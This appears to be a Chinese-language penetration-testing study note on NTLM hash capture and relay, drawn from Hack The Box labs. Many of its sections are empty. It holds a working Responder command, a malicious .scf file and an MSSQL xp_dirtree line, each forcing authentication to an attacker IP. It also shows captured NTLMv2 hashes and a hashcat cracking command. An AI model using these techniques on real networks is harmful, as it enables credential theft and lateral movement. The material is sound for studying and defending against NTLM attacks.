# NTLM

知道密码如何得到NTLMhash：

```shell
python2
import hashlib
hashlib.new('md4', 'REGGIE1234ronnie'.encode('utf-16le')).digest().encode('hex')
```





## NTLM Relay

NTLM Relay 攻击其实应称为 Net-NTLM Relay 攻击，它发生在NTIM认证的第三步，在 Response 消息中存在Net-NTIM Hash， 当攻击者荻得了 Net-NTLM Hash 后，可以重放Net-NTLM Hash 进行中间人攻击。

谢公子_域渗透攻防指南4.7节讲解了很多的利用方式。

首先启动REsponder.py：

```shell
sudo python2 Responder.py -i 10.10.14.14 -wrfv


```



### 1.LLMNR和NBNS协议

TOFO



### 2.打印机漏洞



### 3.PetitPotam



### 4.图标

打开文件夹的时候

desktop.ini 文件：

```

```





写evil.scf：

```shell
[Shell]
Command=2
IconFile=\\10.10.14.14\\pwn.ico
[Taskbar]
Command=ToggleDesktop
```

收到：

```shell
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:db80593a428122ee:F106CF0D023B250EC85C765E46F28047:0101000000000000C0653150DE09D20173E22EE2C0C1F3EF000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000100000000200000992C45A038172D6C22863A24A02D842CA7416B21814D9B7AF739DE479961DD0E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0031003400000000000000000000000000
```









### 5.浏览器



### 6.Outlook



### 7.系统命令



### 8.Office



### 9.PDF



### 10.WPAD



### 11.mssql

```shell
EXEC xp_dirtree '\\10.10.14.14\share', 1, 1
```







注意到hash.txt里面的内容是整行：

```shell
sql_svc::sequel:fc43c3cf9d892a59:DA1E50B737E201DD8658A6D76B21E981:0101000000000000C0653150DE09D201636DA589D7248772000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000300000473F89B23E1854B213BAAA60B3BD1FD6035630C5E4D855EB86994AE26263982F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310034000000000000000000
```



之后两种利用方式，一种是hashcat破解：

```shell
#注意-m是5600
hashcat -m 5600 hash.txt /Users/feng/many-ctf/rockyou.txt --force
```

另外一种是重放Net-NTLM Hash，中继到SMB协议、HTTP协议、LDAP协议等。




